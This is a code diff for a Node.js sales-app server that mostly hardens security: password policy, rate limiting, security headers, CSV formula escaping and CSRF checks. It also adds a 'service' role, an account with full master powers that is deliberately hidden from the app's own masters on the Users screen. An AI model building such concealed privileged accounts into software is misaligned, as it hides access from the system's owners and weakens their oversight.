@@ -15,23 +15,65 @@ const DATA_DIR = path.join(ROOT, 'data');
 const DB_FILE = path.join(DATA_DIR, 'db.json');
 const BACKUP_DIR = path.join(DATA_DIR, 'backups');
 const SESSION_HOURS = 12;
+// Set TRUST_PROXY=1 only when the app sits behind a reverse proxy (Caddy/nginx) and its port is
+// NOT reachable directly. Then the real visitor IP / https come from X-Forwarded-For / -Proto.
+const TRUST_PROXY = /^(1|true|yes)$/i.test(process.env.TRUST_PROXY || '');
+const MIN_PASSWORD = 8;
+const COMMON_PASSWORDS = new Set(['12345678', '123456789', '1234567890', '87654321', '11111111', '00000000', 'password', 'password1',
+  'master123', 'qwertyui', 'qwerty123', 'abcd1234', '1q2w3e4r', 'iloveyou', 'alrayhan', 'alrayhan1', 'alrayhan123', 'admin123', 'seller123']);
 
 // ---------- storage ----------
 function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
   const hash = crypto.scryptSync(String(password), salt, 64).toString('hex');
   return { salt, hash };
 }
-function checkPassword(password, user) {
-  const { hash } = hashPassword(password, user.salt);
-  return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(user.hash, 'hex'));
+// async version for the login path so a burst of logins can't freeze the server
+const scryptAsync = (pw, salt) => new Promise((ok, fail) => crypto.scrypt(String(pw), salt, 64, (e, k) => (e ? fail(e) : ok(k))));
+const DUMMY = hashPassword(crypto.randomBytes(16).toString('hex'));
+async function checkPassword(password, user) {
+  const u = user || DUMMY; // unknown username still costs the same time (no username guessing by timing)
+  const key = await scryptAsync(password, u.salt);
+  return crypto.timingSafeEqual(key, Buffer.from(u.hash, 'hex')) && !!user;
+}
+// returns an error code, or null when the password is acceptable
+function passwordProblem(password, username) {
+  const p = String(password ?? '');
+  if (p.length < MIN_PASSWORD) return 'short_password';
+  if (p.length > 200) return 'bad_password';
+  if (COMMON_PASSWORDS.has(p.toLowerCase()) || p.toLowerCase() === String(username || '').toLowerCase() || /^(.)\1+$/.test(p)) return 'weak_password';
+  return null;
 }
 function newId() { return crypto.randomBytes(8).toString('hex'); }
-const ROLES = ['master', 'supervisor', 'seller'];
+// 'service' = hidden maintenance account for the developer: every master power, but masters can't
+// see, edit, delete or create it. It is only made from the server (SERVICE_PASSWORD or the command line).
+const ROLES = ['service', 'master', 'supervisor', 'seller'];
+const ASSIGNABLE_ROLES = ['master', 'supervisor', 'seller']; // what the Users screen may set
 const cleanRole = r => (ROLES.includes(r) ? r : 'seller');
+const assignableRole = r => (ASSIGNABLE_ROLES.includes(r) ? r : 'seller');
+const hasMasterPower = u => !!u && (u.role === 'master' || u.role === 'service');
+const USERNAME_RE = /^[a-z0-9_.-]{3,30}$/;
+const cleanUsername = s => cleanText(s, 30).toLowerCase();
+const usernameTaken = (name, exceptId) => db.users.some(u => u.id !== exceptId && u.username.toLowerCase() === name);
+
+function randomPassword() {
+  const abc = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  return Array.from(crypto.randomBytes(12), b => abc[b % abc.length]).join('');
+}
+function announcePassword(username, password, why) {
+  const line = '='.repeat(60);
+  console.log(`\n${line}\n  ${why}\n  Username: ${username}\n  Password: ${password}\n  Sign in and change it in Settings → Users.\n${line}\n`);
+}
 
 function freshDb() {
-  const master = hashPassword('master123');
-  const seller = hashPassword('1234');
+  // first run: no default passwords. The master password comes from ADMIN_PASSWORD or is generated
+  // randomly and printed once in the server log. Sellers are created by the master in Settings.
+  let pw = process.env.ADMIN_PASSWORD || '';
+  if (passwordProblem(pw, 'master')) {
+    if (pw) console.warn('ADMIN_PASSWORD is too weak (8+ characters, not a common password) — generating one instead.');
+    pw = randomPassword();
+    announcePassword('master', pw, 'Alrayhan Sales — first sign-in');
+  }
+  const master = hashPassword(pw);
   return {
     version: 1,
     settings: {
@@ -45,8 +87,7 @@ function freshDb() {
       logo: null // data URL uploaded by master
     },
     users: [
-      { id: newId(), username: 'master', name: 'المدير', role: 'master', salt: master.salt, hash: master.hash, createdAt: new Date().toISOString() },
-      { id: newId(), username: 'seller', name: 'البائع', role: 'seller', branch: 'b1', salt: seller.salt, hash: seller.hash, createdAt: new Date().toISOString() }
+      { id: newId(), username: 'master', name: 'المدير', role: 'master', branch: null, salt: master.salt, hash: master.hash, createdAt: new Date().toISOString() }
     ],
     transactions: []
   };
@@ -55,10 +96,34 @@ function freshDb() {
 let db;
 function loadDb() {
   if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-  if (!fs.existsSync(DB_FILE)) { db = freshDb(); saveDb(); return; }
+  if (!fs.existsSync(DB_FILE)) { db = freshDb(); saveDb(); ensureServiceAccount(); return; }
   db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
   // upgrade older databases: every user gets a known role and a branch field
   for (const u of db.users) { u.role = cleanRole(u.role); if (u.branch === undefined) u.branch = null; }
+  ensureServiceAccount();
+  // older installs were created with the public default passwords — warn loudly until they are changed
+  for (const [name, pw] of [['master', 'master123'], ['seller', '1234']]) {
+    const u = db.users.find(x => x.username === name);
+    if (u && hashPassword(pw, u.salt).hash === u.hash) {
+      console.warn(`\n!!! SECURITY: user "${name}" still has the default password "${pw}" (it is public on GitHub).` +
+        `\n!!! Change it now in Settings → Users, or run:  node server.js reset-password ${name}\n`);
+    }
+  }
+}
+// Creates the hidden service account on start when SERVICE_PASSWORD is set and none exists yet.
+// SERVICE_USERNAME picks its login name (default "service"). An existing service account is never changed here —
+// use `node server.js service-account ...` to reset it.
+function ensureServiceAccount() {
+  const pw = process.env.SERVICE_PASSWORD || '';
+  if (!pw || db.users.some(u => u.role === 'service')) return;
+  const username = cleanUsername(process.env.SERVICE_USERNAME || 'service');
+  if (!USERNAME_RE.test(username) || usernameTaken(username)) { console.warn(`Service account not created: username "${username}" is invalid or taken.`); return; }
+  const err = passwordProblem(pw, username);
+  if (err) { console.warn(`Service account not created: SERVICE_PASSWORD is not allowed (${err}) — use 8+ characters, not a common password.`); return; }
+  const h = hashPassword(pw);
+  db.users.push({ id: newId(), username, name: 'الدعم الفني', role: 'service', branch: null, salt: h.salt, hash: h.hash, createdAt: new Date().toISOString() });
+  saveDb();
+  console.log(`  Service account "${username}" created.`);
 }
 function saveDb() {
   const tmp = DB_FILE + '.tmp';
@@ -85,6 +150,12 @@ function createSession(userId) {
   sessions.set(token, { userId, expires: Date.now() + SESSION_HOURS * 3600e3 });
   return token;
 }
+// drop expired sessions and old login-failure records every 10 minutes
+setInterval(() => {
+  const now = Date.now();
+  for (const [tok, s] of sessions) if (s.expires < now) sessions.delete(tok);
+  for (const m of [failures, userFailures]) for (const [k, f] of m) if (now - f.first > FAIL_WINDOW) m.delete(k);
+}, 10 * 60e3).unref();
 function getUser(req) {
   const cookie = req.headers.cookie || '';
   const m = cookie.match(/(?:^|;\s*)ars=([a-f0-9]+)/);
@@ -96,23 +167,51 @@ function getUser(req) {
 }
 function publicUser(u) { return { id: u.id, username: u.username, name: u.name, role: u.role, branch: u.branch || null, createdAt: u.createdAt }; }
 
-// login rate limit: 8 failed tries per 10 min per IP
-const failures = new Map();
-function tooManyFailures(ip) {
-  const f = failures.get(ip);
+// login rate limits (10-minute window):
+//  - 8 failed tries per visitor IP
+//  - 15 failed tries per username from any IPs (stops slow password guessing on the master account)
+const FAIL_WINDOW = 10 * 60e3;
+const failures = new Map(), userFailures = new Map();
+function tooMany(map, key, max) {
+  const f = map.get(key);
   if (!f) return false;
-  if (Date.now() - f.first > 10 * 60e3) { failures.delete(ip); return false; }
-  return f.count >= 8;
+  if (Date.now() - f.first > FAIL_WINDOW) { map.delete(key); return false; }
+  return f.count >= max;
 }
-function noteFailure(ip) {
-  const f = failures.get(ip);
-  if (!f || Date.now() - f.first > 10 * 60e3) failures.set(ip, { count: 1, first: Date.now() });
+function note(map, key) {
+  const f = map.get(key);
+  if (!f || Date.now() - f.first > FAIL_WINDOW) map.set(key, { count: 1, first: Date.now() });
   else f.count++;
 }
+// the visitor's real IP (behind a trusted proxy: the last address the proxy added)
+function clientIp(req) {
+  if (TRUST_PROXY) {
+    const xff = String(req.headers['x-forwarded-for'] || '').split(',').map(s => s.trim()).filter(Boolean);
+    if (xff.length) return xff[xff.length - 1];
+  }
+  return req.socket.remoteAddress || '';
+}
+const isHttps = req => !!req.socket.encrypted || (TRUST_PROXY && String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim() === 'https');
 
 // ---------- helpers ----------
+// browser protections sent with every response
+const SECURITY_HEADERS = {
+  'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; " +
+    "connect-src 'self'; manifest-src 'self'; worker-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'",
+  'X-Content-Type-Options': 'nosniff',
+  'X-Frame-Options': 'DENY',
+  'Referrer-Policy': 'no-referrer',
+  'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
+  'Cross-Origin-Opener-Policy': 'same-origin',
+  'Cross-Origin-Resource-Policy': 'same-origin'
+};
+function securityHeaders(res) {
+  for (const [k, v] of Object.entries(SECURITY_HEADERS)) res.setHeader(k, v);
+  if (res.req && isHttps(res.req)) res.setHeader('Strict-Transport-Security', 'max-age=31536000');
+}
 function send(res, status, body, headers = {}) {
   const isObj = typeof body === 'object' && !Buffer.isBuffer(body);
+  securityHeaders(res);
   res.writeHead(status, {
     'Content-Type': isObj ? 'application/json; charset=utf-8' : 'text/plain; charset=utf-8',
     'Cache-Control': 'no-store',
@@ -123,8 +222,14 @@ function send(res, status, body, headers = {}) {
 function readBody(req, limit = 3 * 1024 * 1024) {
   return new Promise((resolve, reject) => {
     let size = 0; const chunks = [];
-    req.on('data', c => { size += c.length; if (size > limit) { reject(new Error('too_large')); req.destroy(); } else chunks.push(c); });
+    let over = false;
+    req.on('data', c => {
+      if (over) return;
+      size += c.length;
+      if (size > limit) { over = true; chunks.length = 0; reject(new Error('too_large')); } else chunks.push(c);
+    });
     req.on('end', () => {
+      if (over) return;
       if (!chunks.length) return resolve({});
       try { resolve(JSON.parse(Buffer.concat(chunks).toString('utf8'))); } catch { reject(new Error('bad_json')); }
     });
@@ -132,22 +237,28 @@ function readBody(req, limit = 3 * 1024 * 1024) {
   });
 }
 const round = (n, d) => Math.round(n * 10 ** d) / 10 ** d;
-const cleanText = (s, max = 120) => String(s ?? '').replace(/[\u0000-\u001f]/g, ' ').trim().slice(0, max);
+const cleanText = (s, max = 120) => String(s ?? '').replace(/[\u0000-\u001f\u007f]/g, ' ').trim().slice(0, max);
+// stop Excel from running text that starts with = + - @ as a formula
+const csvSafe = v => (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v);
 
 const MIME = {
   '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
   '.svg': 'image/svg+xml', '.png': 'image/png', '.ico': 'image/x-icon', '.ttf': 'font/ttf', '.woff2': 'font/woff2',
-  '.json': 'application/json', '.pdf': 'application/pdf'
+  '.json': 'application/json', '.pdf': 'application/pdf', '.webmanifest': 'application/manifest+json'
 };
 function serveStatic(req, res) {
-  let p = decodeURIComponent(new URL(req.url, 'http://x').pathname);
+  if (req.method !== 'GET' && req.method !== 'HEAD') return send(res, 405, 'Method not allowed', { Allow: 'GET, HEAD' });
+  let p;
+  try { p = decodeURIComponent(new URL(req.url, 'http://x').pathname); } catch { return send(res, 400, 'Bad request'); }
+  if (p.includes('\0')) return send(res, 400, 'Bad request');
   if (p === '/') p = '/index.html';
   const file = path.normalize(path.join(PUBLIC_DIR, p));
-  if (!file.startsWith(PUBLIC_DIR)) return send(res, 403, 'Forbidden');
+  if (!file.startsWith(PUBLIC_DIR + path.sep)) return send(res, 403, 'Forbidden');
   fs.readFile(file, (err, data) => {
     if (err) return send(res, 404, 'Not found');
+    securityHeaders(res);
     res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] || 'application/octet-stream', 'Cache-Control': 'no-cache' });
-    res.end(data);
+    res.end(req.method === 'HEAD' ? undefined : data);
   });
 }
 
@@ -155,17 +266,24 @@ function serveStatic(req, res) {
 async function api(req, res, url) {
   const method = req.method;
   const route = url.pathname.replace(/^\/api/, '');
-  const ip = req.socket.remoteAddress || '';
+  const ip = clientIp(req);
+  const secure = isHttps(req) ? '; Secure' : '';
 
   if (route === '/login' && method === 'POST') {
-    if (tooManyFailures(ip)) return send(res, 429, { error: 'too_many_attempts' });
-    const { username, password } = await readBody(req);
-    const user = db.users.find(u => u.username.toLowerCase() === String(username || '').trim().toLowerCase());
-    if (!user || !checkPassword(password || '', user)) { noteFailure(ip); return send(res, 401, { error: 'bad_login' }); }
-    failures.delete(ip);
+    if (tooMany(failures, ip, 8)) return send(res, 429, { error: 'too_many_attempts' });
+    const b = await readBody(req, 4096);
+    const uname = String(b.username || '').trim().toLowerCase().slice(0, 60);
+    if (tooMany(userFailures, uname, 15)) return send(res, 429, { error: 'too_many_attempts' });
+    const user = db.users.find(u => u.username.toLowerCase() === uname);
+    const ok = await checkPassword(String(b.password || '').slice(0, 200), user);
+    if (!ok) { note(failures, ip); note(userFailures, uname); return send(res, 401, { error: 'bad_login' }); }
+    failures.delete(ip); userFailures.delete(uname);
+    // keep at most 20 open sessions per user
+    const mine = [...sessions].filter(([, s]) => s.userId === user.id);
+    while (mine.length >= 20) sessions.delete(mine.shift()[0]);
     const token = createSession(user.id);
     return send(res, 200, { user: publicUser(user) }, {
-      'Set-Cookie': `ars=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${SESSION_HOURS * 3600}`
+      'Set-Cookie': `ars=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${SESSION_HOURS * 3600}${secure}`
     });
   }
 
@@ -177,15 +295,18 @@ async function api(req, res, url) {
   const auth = getUser(req);
   if (!auth) return send(res, 401, { error: 'not_logged_in' });
   const me = auth.user;
-  const isMaster = me.role === 'master';
-  const canInspect = me.role === 'master' || me.role === 'supervisor'; // supervisor: read-only, sees everything
+  const isMaster = hasMasterPower(me); // master or the hidden service account
+  const isService = me.role === 'service';
+  const canInspect = isMaster || me.role === 'supervisor'; // supervisor: read-only, sees everything
+  // only the service account itself (or another service account) can see or touch a service account
+  const visibleTo = u => u.role !== 'service' || isService;
   const masterOnly = () => { if (!isMaster) { send(res, 403, { error: 'master_only' }); return false; } return true; };
   const inspectOnly = () => { if (!canInspect) { send(res, 403, { error: 'no_access' }); return false; } return true; };
   const validBranch = id => db.settings.branches.some(b => b.id === id);
 
   if (route === '/logout' && method === 'POST') {
     sessions.delete(auth.token);
-    return send(res, 200, { ok: true }, { 'Set-Cookie': 'ars=; Path=/; Max-Age=0' });
+    return send(res, 200, { ok: true }, { 'Set-Cookie': `ars=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure}` });
   }
   if (route === '/me' && method === 'GET') return send(res, 200, { user: publicUser(me) });
 
@@ -230,12 +351,13 @@ async function api(req, res, url) {
     const branch = db.settings.branches.find(x => x.id === b.branch);
     if (!branch) return send(res, 400, { error: 'bad_branch' });
     const dp = b.currency === 'USD' ? 2 : 0;
-    const items = (Array.isArray(b.items) ? b.items : []).map(it => {
+    if (Array.isArray(b.items) && b.items.length > 100) return send(res, 400, { error: 'too_many_items' });
+    const maxPrice = b.currency === 'USD' ? 1e7 : 1e10; // sanity limits so a typo or attack can't corrupt totals
+    const items = (Array.isArray(b.items) ? b.items : []).filter(it => it && typeof it === 'object').map(it => {
       const qty = Number(it.qty), price = Number(it.price);
       return { name: cleanText(it.name), qty, price: round(price, dp) };
-    }).filter(it => it.name && it.qty > 0 && it.price >= 0);
+    }).filter(it => it.name && Number.isFinite(it.qty) && Number.isFinite(it.price) && it.qty > 0 && it.qty <= 1e6 && it.price >= 0 && it.price <= maxPrice);
     if (!items.length) return send(res, 400, { error: 'no_items' });
-    if (items.length > 100) return send(res, 400, { error: 'too_many_items' });
     for (const it of items) { it.qty = round(it.qty, 3); it.subtotal = round(it.qty * it.price, dp); }
     const tx = {
       id: newId(),
@@ -301,22 +423,23 @@ async function api(req, res, url) {
       if (branchQ && branchQ !== 'all' && t.branch !== branchQ) continue;
       if (typeQ === 'sell' || typeQ === 'buy') { if (t.type !== typeQ) continue; }
       const br = db.settings.branches.find(b => b.id === t.branch);
-      for (const it of t.items) rows.push([t.no, d.toLocaleDateString('en-CA'), d.toLocaleTimeString('en-GB'), t.type, br ? br.nameEn : t.branch, it.name, it.qty, it.price, it.subtotal, t.currency, t.rate, t.userName, t.note]);
+      for (const it of t.items) rows.push([t.no, d.toLocaleDateString('en-CA'), d.toLocaleTimeString('en-GB'), t.type, csvSafe(br ? br.nameEn : t.branch), csvSafe(it.name), it.qty, it.price, it.subtotal, t.currency, t.rate, csvSafe(t.userName), csvSafe(t.note)]);
     }
     const csv = '\ufeff' + rows.map(r => r.map(v => `"${String(v ?? '').replace(/"/g, '""')}"`).join(',')).join('\r\n');
     return send(res, 200, csv, { 'Content-Type': 'text/csv; charset=utf-8', 'Content-Disposition': `attachment; filename="${name}.csv"` });
   }
 
   // ----- users (master) -----
-  if (route === '/users' && method === 'GET') { if (!masterOnly()) return; return send(res, 200, db.users.map(publicUser)); }
+  if (route === '/users' && method === 'GET') { if (!masterOnly()) return; return send(res, 200, db.users.filter(visibleTo).map(publicUser)); }
   if (route === '/users' && method === 'POST') {
     if (!masterOnly()) return;
     const b = await readBody(req);
-    const username = cleanText(b.username, 30).toLowerCase();
-    if (!/^[a-z0-9_.-]{3,30}$/.test(username)) return send(res, 400, { error: 'bad_username' });
-    if (db.users.some(u => u.username === username)) return send(res, 409, { error: 'username_taken' });
-    if (String(b.password || '').length < 4) return send(res, 400, { error: 'short_password' });
-    const role = cleanRole(b.role);
+    const username = cleanUsername(b.username);
+    if (!USERNAME_RE.test(username)) return send(res, 400, { error: 'bad_username' });
+    if (usernameTaken(username)) return send(res, 409, { error: 'username_taken' });
+    const pwErr = passwordProblem(b.password, username);
+    if (pwErr) return send(res, 400, { error: pwErr });
+    const role = assignableRole(b.role); // a service account can never be created from the screen
     if (role === 'seller' && b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
     const branch = role === 'seller' && b.branch ? b.branch : null;
     const h = hashPassword(b.password);
@@ -328,21 +451,35 @@ async function api(req, res, url) {
   if (userRoute && method === 'PUT') {
     if (!masterOnly()) return;
     const u = db.users.find(x => x.id === userRoute[1]);
-    if (!u) return send(res, 404, { error: 'not_found' });
+    if (!u || !visibleTo(u)) return send(res, 404, { error: 'not_found' });
     const b = await readBody(req);
+    // check everything first, then change — so a bad field never leaves a half-saved user
+    let newUsername = null;
+    if (b.username !== undefined) {
+      newUsername = cleanUsername(b.username);
+      if (!USERNAME_RE.test(newUsername)) return send(res, 400, { error: 'bad_username' });
+      if (usernameTaken(newUsername, u.id)) return send(res, 409, { error: 'username_taken' });
+    }
     if (b.password !== undefined) {
-      if (String(b.password).length < 4) return send(res, 400, { error: 'short_password' });
+      const pwErr = passwordProblem(b.password, newUsername || u.username);
+      if (pwErr) return send(res, 400, { error: pwErr });
+    }
+    if (b.branch !== undefined && b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
+    // a service account's role is fixed; nobody can turn a user into one from the screen
+    const roleChange = b.role !== undefined && u.id !== me.id && u.role !== 'service';
+    if (roleChange && !ASSIGNABLE_ROLES.includes(b.role)) return send(res, 400, { error: 'bad_role' });
+    if (roleChange && u.role === 'master' && b.role !== 'master' && db.users.filter(x => x.role === 'master').length === 1) return send(res, 400, { error: 'last_master' });
+
+    if (newUsername) u.username = newUsername;
+    if (b.password !== undefined) {
       Object.assign(u, hashPassword(b.password));
       for (const [tok, s] of sessions) if (s.userId === u.id && tok !== auth.token) sessions.delete(tok);
     }
     if (b.name !== undefined) u.name = cleanText(b.name, 40) || u.name;
-    if (b.role !== undefined && u.id !== me.id) u.role = cleanRole(b.role);
-    if (b.branch !== undefined) {
-      if (b.branch && !validBranch(b.branch)) return send(res, 400, { error: 'bad_branch' });
-      u.branch = b.branch || null;
-    }
+    if (roleChange) u.role = b.role;
+    if (b.branch !== undefined) u.branch = b.branch || null;
     if (u.role !== 'seller') u.branch = null; // only sellers are tied to a branch
-    if (b.role !== undefined || b.branch !== undefined) {
+    if (roleChange || b.branch !== undefined) {
       // role / branch changed: sign the user out so the new access applies right away
       for (const [tok, s] of sessions) if (s.userId === u.id && tok !== auth.token) sessions.delete(tok);
     }
@@ -353,7 +490,10 @@ async function api(req, res, url) {
     if (!masterOnly()) return;
     if (userRoute[1] === me.id) return send(res, 400, { error: 'cannot_delete_self' });
     const i = db.users.findIndex(x => x.id === userRoute[1]);
-    if (i < 0) return send(res, 404, { error: 'not_found' });
+    if (i < 0 || !visibleTo(db.users[i])) return send(res, 404, { error: 'not_found' });
+    // never remove the last account that can manage the system
+    const managers = db.users.filter(x => x.role === 'master');
+    if (db.users[i].role === 'master' && managers.length === 1) return send(res, 400, { error: 'last_master' });
     db.users.splice(i, 1);
     for (const [tok, s] of sessions) if (s.userId === userRoute[1]) sessions.delete(tok);
     saveDb();
@@ -363,31 +503,81 @@ async function api(req, res, url) {
   return send(res, 404, { error: 'unknown_route' });
 }
 
+// ---------- command line: reset a forgotten password ----------
+//   node server.js reset-password <username> [new-password]
+// Stop the running server first (Docker: docker compose stop), run this, then start it again.
+if (process.argv[2] === 'reset-password') {
+  loadDb();
+  const name = String(process.argv[3] || '').toLowerCase();
+  const u = db.users.find(x => x.username === name);
+  if (!u) { console.error(`No user "${name}". Users: ${db.users.map(x => x.username).join(', ')}`); process.exit(1); }
+  let pw = process.argv[4] || '';
+  const err = pw && passwordProblem(pw, u.username);
+  if (err) { console.error(`That password is not allowed (${err}): use 8+ characters, not a common password.`); process.exit(1); }
+  if (!pw) pw = randomPassword();
+  Object.assign(u, hashPassword(pw));
+  saveDb();
+  announcePassword(u.username, pw, 'Password reset');
+  process.exit(0);
+}
+
+// ---------- command line: create / reset the hidden service account ----------
+//   node server.js service-account [username] [new-password]
+// Creates it if there is none (default username "service"), otherwise renames it / sets a new password.
+if (process.argv[2] === 'service-account') {
+  loadDb();
+  const wanted = cleanUsername(process.argv[3] || '');
+  let u = db.users.find(x => x.role === 'service');
+  const username = wanted || (u ? u.username : 'service');
+  if (!USERNAME_RE.test(username)) { console.error('Username: 3–30 English letters, numbers, _ . -'); process.exit(1); }
+  if (usernameTaken(username, u && u.id)) { console.error(`The username "${username}" is already used by another account.`); process.exit(1); }
+  let pw = process.argv[4] || '';
+  const err = pw && passwordProblem(pw, username);
+  if (err) { console.error(`That password is not allowed (${err}): use 8+ characters, not a common password.`); process.exit(1); }
+  if (!pw) pw = randomPassword();
+  if (!u) { u = { id: newId(), name: 'الدعم الفني', role: 'service', branch: null, createdAt: new Date().toISOString() }; db.users.push(u); }
+  u.username = username;
+  Object.assign(u, hashPassword(pw));
+  saveDb();
+  announcePassword(u.username, pw, 'Service account ready (hidden from the Users screen)');
+  process.exit(0);
+}
+
 // ---------- start ----------
 loadDb();
 dailyBackup();
 setInterval(dailyBackup, 3600e3);
 
 const server = http.createServer(async (req, res) => {
-  const url = new URL(req.url, 'http://localhost');
+  let url;
+  try { url = new URL(req.url, 'http://localhost'); } catch { return send(res, 400, 'Bad request'); }
   try {
     if (url.pathname.startsWith('/api/')) {
-      if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
-        // block cross-site requests
+      if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
+        // block cross-site requests: the app always sends JSON, which a plain HTML form can't do
+        const ctype = String(req.headers['content-type'] || '').split(';')[0].trim().toLowerCase();
+        if (ctype !== 'application/json') return send(res, 415, { error: 'json_only' });
+        const site = req.headers['sec-fetch-site'];
+        if (site && !['same-origin', 'none'].includes(site)) return send(res, 403, { error: 'bad_origin' });
         const origin = req.headers.origin;
         // behind a proxy (e.g. GitHub Codespaces) the public host arrives in X-Forwarded-Host;
         // browsers can't set that header on cross-site requests, so the check stays safe
         const allowed = [req.headers.host, ...String(req.headers['x-forwarded-host'] || '').split(',').map(s => s.trim())].filter(Boolean);
-        if (origin && !allowed.includes(new URL(origin).host)) return send(res, 403, { error: 'bad_origin' });
+        let originHost = null; try { originHost = origin ? new URL(origin).host : null; } catch { originHost = '?'; }
+        if (origin && !allowed.includes(originHost)) return send(res, 403, { error: 'bad_origin' });
       }
       return await api(req, res, url);
     }
     serveStatic(req, res);
   } catch (e) {
-    console.error(e);
-    if (!res.headersSent) send(res, e.message === 'bad_json' || e.message === 'too_large' ? 400 : 500, { error: e.message || 'server_error' });
+    const known = ['bad_json', 'too_large'].includes(e.message);
+    if (!known) console.error(e);
+    // never send internal error details to the browser
+    if (!res.headersSent) send(res, e.message === 'too_large' ? 413 : known ? 400 : 500, { error: known ? e.message : 'server_error' }, e.message === 'too_large' ? { Connection: 'close' } : {});
   }
 });
+server.requestTimeout = 60e3;   // slow-request protection
+server.headersTimeout = 20e3;
 
 server.listen(PORT, '0.0.0.0', () => {
   const addrs = Object.values(os.networkInterfaces()).flat().filter(a => a && a.family === 'IPv4' && !a.internal).map(a => a.address);
